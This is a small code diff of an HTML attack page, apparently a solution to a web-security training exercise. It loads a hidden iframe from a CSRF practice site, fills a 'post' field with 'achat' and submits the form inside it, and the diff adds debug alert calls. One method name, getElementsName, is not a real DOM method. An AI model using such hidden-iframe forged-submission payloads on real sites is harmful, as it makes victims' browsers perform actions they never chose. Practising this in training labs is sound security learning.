@@ -1,6 +1,8 @@
-<iframe id="ifr"src="https://csrf.websecurity.church/make_post/3" style="display: none;" onload="loaded()"></iframe>
+<iframe id="ifr" src="https://csrf.websecurity.church/make_post/3" style="display: none;" onload="loaded()"></iframe>
 <script>
+    alert(0);
     function loaded(){
+    alert(1);
     var iframe = document.getElementById("ifr");
     iframe.contentWindow.document.getElementsName("post")[0].value="achat";
     iframe.contentWindow.document.getElementById("post_form").submit();
